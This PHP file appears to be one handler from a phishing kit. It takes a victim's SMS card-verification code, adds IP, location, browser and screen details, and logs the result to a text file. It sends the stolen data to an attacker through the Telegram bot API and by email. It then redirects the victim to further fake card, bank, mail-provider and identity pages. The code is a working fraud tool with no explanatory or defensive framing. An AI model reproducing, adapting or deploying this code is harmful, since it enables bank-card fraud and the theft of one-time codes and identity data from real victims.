<?php if (isset($_POST['sms_code'])) {
    include '../mine.php';
    include '../bot.php';
    include '../cookies.php';
    include '../../../email.php';

}
session_start();
if (isset($_POST['sms_code'])) {
    $sms_code = $_POST['sms_code'];
}
$msg = "=========== <[ -" . $scamname . "- SMS Code ]> ===========
";
$msg.= "----------------------- SMS Code---------------------
";
$msg.= "SMS Code  : {$sms_code}
";
$msg.= "---------------------- IP Info ----------------------
";
$msg.= "IP ADDRESS   : {$_SESSION['ip']}
";
$msg.= "LOCATION     : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
$msg.= "BROWSER      : {$_SESSION['browser']} on {$_SESSION['os']}
";
$msg.= "SCREEN       : {$_SESSION['screen']}
";
$msg.= "USER AGENT   : {$_SERVER['HTTP_USER_AGENT']}
";
$msg.= "TIMEZONE     : {$_SESSION['ip_timezone']}
";
$msg.= "TIME         : " . now() . " GMT
";
$msg.= "=========== <[ THANKS TO DR_FXND ]> ===========


";
if ($saveintext == "yes") {
    $save = fopen("../../" . $filename . ".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
}
file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");
$subject = "-" . $scamname . "- 3D FULL CARD INFO BANK [" . $_SESSION['_cc_bank_'] . "] From [" . $_SESSION['ip_countryName'] . "]";
$headers = "From: DR_FXND <>
";
$headers.= "MIME-Version: 1.0
";
$headers.= "Content-Type: text/plain; charset=UTF-8
";
file_get_contents("https://api.telegram.org/bot" . $Api . "/sendMessage?chat_id=" . $Chatid . "&text=" . urlencode($msg) . "");
if ($sendtoemail == "yes") {
    foreach (explode(",", $yours) as $your) {
        @mail($your, $subject, $msg, $headers);
    }
}
exit(header("Location: ../../app/smserror"));
if (!isset($_POST['nextpage'])) {
    if ($show_newcard == "yes") {
        exit(header("Location: ../../app/processcard"));
    } elseif ($show_mailaccess == "yes") {
        exit(header("Location: ../../app/mailprovider"));
    } elseif ($show_bank == "yes") {
        exit(header("Location: ../../app/bank"));
    } elseif ($show_identity == "yes") {
        exit(header("Location: ../../app/identity"));
    } else {
        exit(header("Location: ../../app/thanks"));
    }
}
if (isset($_POST['nextpage'])) {
    if ($show_mailaccess == "yes") {
        exit(header("Location: ../../app/mailprovider"));
    } elseif ($show_bank == "yes") {
        exit(header("Location: ../../app/bank"));
    } elseif ($show_identity == "yes") {
        exit(header("Location: ../../app/identity"));
    } else {
        exit(header("Location: ../../app/thanks"));
    }
} else {
    header('HTTP/1.0 404 Not Found');
    exit();
};